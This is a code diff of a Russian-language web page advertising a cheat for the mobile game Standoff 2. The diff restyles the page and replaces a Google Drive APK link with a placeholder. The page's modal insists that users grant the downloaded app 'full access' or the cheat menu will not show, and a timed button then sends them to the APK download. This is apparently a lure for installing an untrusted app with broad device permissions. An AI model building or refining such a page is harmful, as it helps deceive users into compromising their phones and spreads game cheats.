@@ -2,42 +2,56 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Standoff 2 Cheat HUB</title>
   <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
       background: #0f0f0f;
       color: #f2f2f2;
       font-family: 'Segoe UI', sans-serif;
-      text-align: center;
-      padding-top: 100px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding: 30px 20px;
     }
 
     .container {
-      max-width: 500px;
-      margin: auto;
+      width: 100%;
+      max-width: 400px;
       background: #1a1a1a;
-      padding: 40px;
+      padding: 30px 20px;
       border-radius: 20px;
       box-shadow: 0 0 30px rgba(255, 255, 255, 0.1);
+      text-align: center;
     }
 
     h1 {
       color: #00ffcc;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
+      font-size: 24px;
     }
 
     p {
       color: #bbbbbb;
-      font-size: 16px;
+      font-size: 15px;
+      line-height: 1.5;
     }
 
     .download-btn {
       display: inline-block;
-      margin-top: 30px;
-      padding: 15px 30px;
+      margin-top: 25px;
+      padding: 14px 25px;
       background-color: #00cc99;
       color: #fff;
-      border-radius: 10px;
+      border-radius: 12px;
       font-weight: bold;
       font-size: 16px;
       text-decoration: none;
@@ -59,15 +73,16 @@
       width: 100%;
       height: 100%;
       background-color: rgba(0,0,0,0.7);
+      align-items: center;
+      justify-content: center;
     }
 
     .modal-content {
       background-color: #1a1a1a;
-      margin: 15% auto;
-      padding: 30px;
+      padding: 25px 20px;
       border-radius: 15px;
-      width: 80%;
-      max-width: 400px;
+      width: 90%;
+      max-width: 350px;
       color: #fff;
       text-align: center;
       box-shadow: 0 0 20px #00ffcc;
@@ -75,17 +90,21 @@
 
     .modal-content p {
       margin-bottom: 20px;
+      font-size: 15px;
+      line-height: 1.4;
     }
 
     #confirmBtn {
       background-color: #00cc99;
-      padding: 10px 20px;
+      padding: 12px 25px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       color: white;
       font-weight: bold;
+      font-size: 15px;
       cursor: not-allowed;
       opacity: 0.6;
+      transition: opacity 0.3s;
     }
 
     #confirmBtn.enabled {
@@ -101,16 +120,13 @@
     <p>Добро пожаловать в приватный хаб читов для Standoff 2.<br>
        Здесь ты можешь скачать последнюю версию чита и получить доступ к обновлениям.</p>
 
-    <!-- Кнопка скачивания вызывает модальное окно -->
     <span class="download-btn" onclick="showModal()">Скачать чит</span>
   </div>
 
-  <!-- Модальное окно -->
   <div id="infoModal" class="modal">
     <div class="modal-content">
       <p>
         ⚠️ <strong>Уведомление:</strong><br>
-        <!-- Твой текст здесь -->
         После запуска чита ОБЯЗАТЕЛЬНО дайте полный доступ, ИНАЧЕ ЧИТ-МЕНЮ НЕ БУДЕТ ОТОБРАЖАТСЯ!
       </p>
       <button id="confirmBtn" disabled>Подождите 10 секунд...</button>
@@ -119,8 +135,11 @@
 
   <script>
     function showModal() {
-      document.getElementById('infoModal').style.display = 'block';
-      let btn = document.getElementById('confirmBtn');
+      const modal = document.getElementById('infoModal');
+      modal.style.display = 'flex';
+      document.body.style.overflow = 'hidden';
+
+      const btn = document.getElementById('confirmBtn');
       let seconds = 10;
       btn.innerText = `Подождите ${seconds} секунд...`;
       btn.classList.remove('enabled');
@@ -135,7 +154,9 @@
           btn.disabled = false;
           btn.classList.add('enabled');
           btn.onclick = () => {
-            window.location.href = "https://drive.google.com/uc?export=download&id=1LyQIFADCeZzLq-yg59VzpOyMp7IIkCLy"; // сюда вставь ссылку на apk
+            window.location.href = "https://your-apk-host-link.com/yourfile.apk";
+            document.body.style.overflow = '';
+            modal.style.display = 'none';
           };
         }
       }, 1000);
